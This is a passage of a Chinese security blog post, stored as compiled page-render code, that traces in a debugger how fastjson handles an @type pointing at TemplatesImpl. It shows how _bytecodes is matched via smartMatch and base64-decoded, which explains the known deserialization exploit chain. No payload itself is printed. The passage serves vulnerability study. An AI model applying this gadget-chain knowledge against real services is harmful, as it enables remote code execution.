"),t("p",[s._v("这里的会根据生成的parser来进行解析，先跟进该类的的构造方法看一下：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/mYp8lrISvVqfa5X.png",alt:"image-20201204165438506"}})]),s._v(" "),t("p",[s._v("调用了"),t("code",[s._v("JSONScanner")]),s._v("的构造方法生成该类的实例，这个对象是用于词法解析的，跳出这个方法然后再回到"),t("code",[s._v("DefaultJSONParser")]),s._v("，继续跟进"),t("code",[s._v("this()")]),s._v("：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/vlp3jqQFMwcRIiu.png",alt:"image-20201204170121458"}})]),s._v(" "),t("p",[s._v("这里会拿到JSON文本的第一个字符"),t("code",[s._v("{")]),s._v("，然后"),t("code",[s._v("lexer.next()")]),s._v("方法会把JSONScanner（以下简称扫描器）的解析指针往后移一位：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/YwIG1B4x68lbW7T.png",alt:"image-20201204171106132"}})]),s._v(" "),t("p",[s._v("然后再设置token为12。再往下跟进到"),t("code",[s._v("DefaultJSONParser.parse")]),s._v("，此时调用栈如下：")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("parse:1306, DefaultJSONParser (com.alibaba.fastjson.parser)\nparse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)\nparse:137, JSON (com.alibaba.fastjson)\nparse:193, JSON (com.alibaba.fastjson)\nparseObject:197, JSON (com.alibaba.fastjson)\nmain:34, Demo (com.demo2)\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br")])]),t("p",[s._v("跟进该方法：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/CEDG4aVbx1eQAN6.png",alt:"image-20201204171502845"}})]),s._v(" "),t("p",[s._v("这里会根据我们之前获取的token来进入不同的case分支，由于我们的token是12，所以进入了这里：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/vq5Ny791ArEIHYU.png",alt:"image-20201204171559424"}})]),s._v(" "),t("p",[s._v("接着跟进"),t("code",[s._v("parseObject")]),s._v("：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/xca5QF4PJTdRMou.png",alt:"image-20201204171711945"}})]),s._v(" "),t("p",[s._v("扫描器的"),t("code",[s._v("scanSymbol")]),s._v("方法会把我们第一个键名"),t("code",[s._v("@type")]),s._v("扫描出来，然后根据"),t("code",[s._v("@type")]),s._v("进入这里：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/SzWsMkjplRKe17w.png",alt:"image-20201204172310392"}})]),s._v(" "),t("p",[s._v("这里的"),t("code",[s._v("scanSymbol")]),s._v("会扫描出"),t("code",[s._v("@type")]),s._v("所指定的类，这里是"),t("code",[s._v("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl")]),s._v("，然后调用"),t("code",[s._v("TypeUtils.loadClass")]),s._v("加载该类到缓存中并返回这个类（这里先不详细展开说，后面说补丁绕过会具体跟进这个方法调试）。")]),s._v(" "),t("p",[s._v("当我们获取到这个类之后再往下调试，这里会根据获取到的clazz来获取对应的deserializer：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/lgrizUBuw18NOfd.png",alt:"image-20201204172836744"}})]),s._v(" "),t("p",[s._v("跟进该方法调试到如下位置：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/jS8XPpKuR2srg6z.png",alt:"image-20201204173912481"}})]),s._v(" "),t("p",[s._v("此时函数调用栈如下：")]),s._v(" "),t("div",{staticClass:"language-java line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-java"}},[t("code",[s._v("createJavaBeanDeserializer"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("526")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("ParserConfig")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("parser"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ngetDeserializer"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("461")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("ParserConfig")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("parser"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ngetDeserializer"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("312")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("ParserConfig")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("parser"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nparseObject"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("367")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("DefaultJSONParser")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("parser"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nparse"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1327")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("DefaultJSONParser")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("parser"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nparse"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1293")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("DefaultJSONParser")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("parser"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nparse"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("137")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" JSON "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nparse"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("193")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" JSON "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nparseObject"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("197")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" JSON "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nmain"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("34")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Demo")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("demo2"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br")])]),t("p",[s._v("跟进该方法到如下关键位置，调用了"),t("code",[s._v("JavaBeanInfo.buid")]),s._v("：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/14HEx2rCcZDBqQl.png",alt:"image-20201204192933453"}})]),s._v(" "),t("p",[s._v("再跟进该方法：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/HNesQTwJX7641Wz.png",alt:"image-20201204193240564"}})]),s._v(" "),t("p",[s._v("这个方法中会通过反射来获取传入的clazz的全部方法和成员变量，然后在这里会对方法进行筛选，我们在上一篇文章中说的满足条件的setter和getter就是在这里筛选出来的，之后会把筛选出来的方法添加到fieldList中，由于这部分代码比较长，我这里就截取一部分：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/3LZjvo4zUpabVCd.png",alt:"image-20201204193923994"}})]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/5xHnv2itp7GZ8Kq.png",alt:"image-20201204194035212"}})]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/4YLWhIsdkoDRUG7.png",alt:"image-20201204194106005"}})]),s._v(" "),t("p",[s._v("筛选完方法之后就作为参数传入"),t("code",[s._v("JavaBeanInfo")]),s._v("的构造方法中用于生成该类的实例，也就是对应的deserializer：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/1eziDldmXISJCbt.png",alt:"image-20201204194307688"}})]),s._v(" "),t("p",[s._v("然后返回上层，准备执行"),t("code",[s._v("JavaBeanDeserializer.deserialze")]),s._v("这个关键函数：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/fnUi13MHxBokwsq.png",alt:"image-20201204194602032"}})]),s._v(" "),t("p",[s._v("跟进该方法，方法内会循环扫描解析，当扫描到key为"),t("code",[s._v("_bytecodes")]),s._v("的时候会调用这里的"),t("code",[s._v("DefaultJSONParser.parseField")]),s._v("来对其进行解析：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/q4gBEkwXNisyz3W.png",alt:"image-20201204201926874"}})]),s._v(" "),t("p",[s._v("继续跟进，方法内调用了"),t("code",[s._v("smartMatch")]),s._v("方法来匹配key来获取对应的"),t("code",[s._v("FieldDeserializer")]),s._v("：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/vInxCYoWjgFauMs.png",alt:"image-20201204202540732"}})]),s._v(" "),t("p",[s._v("我们再跟进这个方法，在这个方法中会拿"),t("code",[s._v("_bytecodes")]),s._v("和"),t("code",[s._v("JavaBeanDeserializer.sortedFieldDeserializers")]),s._v("中的"),t("code",[s._v("fieldInfo")]),s._v("来进行比较：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/T47WlZpo5QczOGY.png",alt:"image-20201204203531261"}})]),s._v(" "),t("p",[t("code",[s._v("_bytecodes")]),s._v("会因为条件都不满足最后返回null，我们再回到上层的"),t("code",[s._v("smartMatch")]),s._v("，因为获取到的"),t("code",[s._v("fieldDeserializer")]),s._v("为null，所以会进入到下面这个分支中：")]),s._v(" "),t("p",[t("img",{attrs:{src:"C:%5CUsers%5C45258%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201204203804697.png",alt:"image-20201204203804697"}})]),s._v(" "),t("p",[s._v("在这个分支中会把key的"),t("code",[s._v("-")]),s._v("，"),t("code",[s._v("_")]),s._v("等替换为空：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/ZAn9we8g4V2GFOW.png",alt:"image-20201204203929497"}})]),s._v(" "),t("p",[s._v("经过处理后"),t("code",[s._v("_bytecodes")]),s._v("变成了"),t("code",[s._v("bytecodes")]),s._v("，然后再次调用"),t("code",[s._v("getFieldDeserializer")]),s._v("获取对应的"),t("code",[s._v("fieldDeserializer")]),s._v("：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/sEiN1GCwPOMdnep.png",alt:"image-20201204204041018"}})]),s._v(" "),t("p",[s._v("但是返回的仍是null，再经过"),t("code",[s._v("smartMatch")]),s._v("这么多处理之后还是没有获取到相应的"),t("code",[s._v("fieldDeserializer")]),s._v("，之后会在"),t("code",[s._v("JavaBeanDeserializer#parseField")]),s._v("中创建一个"),t("code",[s._v("DefaultFieldDeserializer")]),s._v("：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/9qvcnxHXTPBszVJ.png",alt:"image-20201204213023811"}})]),s._v(" "),t("p",[s._v("然后调用"),t("code",[s._v("DefaultFieldDeserializer#parseField")]),s._v("，进行"),t("code",[s._v("_bytecodes")]),s._v("的解析：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/UCPq6TAKfMvY8VW.png",alt:"image-20201204213202098"}})]),s._v(" "),t("p",[s._v("跟进该方法，在这里会把JSON文本中的"),t("code",[s._v("_bytecodes")]),s._v("的值解析出来：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/5aeRxO921b4o6YA.png",alt:"image-20201204213504691"}})]),s._v(" "),t("p",[s._v("接着跟进该方法，然后会进入到"),t("code",[s._v("DefaultJSONParser#parseArray")]),s._v("方法：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/fU5SB3bwDETV1LN.png",alt:"image-20201204213651091"}})]),s._v(" "),t("p",[s._v("接着跟进方法，调试到这个关键位置：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/4Wm2xzDeSHMfBdR.png",alt:"image-20201204213759910"}})]),s._v(" "),t("p",[s._v("跟进，然后这里会获取一个byte数组，也就是"),t("code",[s._v("_bytes")]),s._v("所对应的值：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/XpkAyzT4UDuIrRN.png",alt:"image-20201204213951025"}})]),s._v(" "),t("p",[s._v("跟进箭头所指的方法，发现它对数组进行了一次base64解码（这就是为什么POC中要对"),t("code",[s._v("_bytecodes")]),s._v("的值进行base64编码的原因）：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/AVS8wjzUno764WY.png",alt:"image-20201204214030952"}})]),s._v(" "),t("p",[s._v("此时函数的调用栈如下：")]),s._v(" "),t("div",{staticClass:"language-java line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-java"}},[t("code",[s._v("bytesValue"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("112")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("JSONScanner")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("parser"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ndeserialze"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("136")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("ObjectArrayCodec")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("serializer"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nparseArray"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("723")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("DefaultJSONParser")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("parser"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ndeserialze"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("177")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("ObjectArrayCodec")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("serializer"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nparseField"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("71")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("DefaultFieldDeserializer")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("parser"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("deserializer"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nparseField"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("773")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("JavaBeanDeserializer")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("parser"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("deserializer"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ndeserialze"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("600")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("JavaBeanDeserializer")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("parser"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("deserializer"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ndeserialze"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("188")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("JavaBeanDeserializer")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("parser"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("deserializer"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ndeserialze"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("184")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("JavaBeanDeserializer")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("parser"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("deserializer"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nparseObject"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("368")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("DefaultJSONParser")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("parser"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nparse"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1327")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("DefaultJSONParser")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("parser"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nparse"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1293")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("DefaultJSONParser")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("parser"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nparse"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("137")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" JSON "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nparse"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("193")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" JSON "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nparseObject"),t("span",{pre:!0,attrs:{class:"token 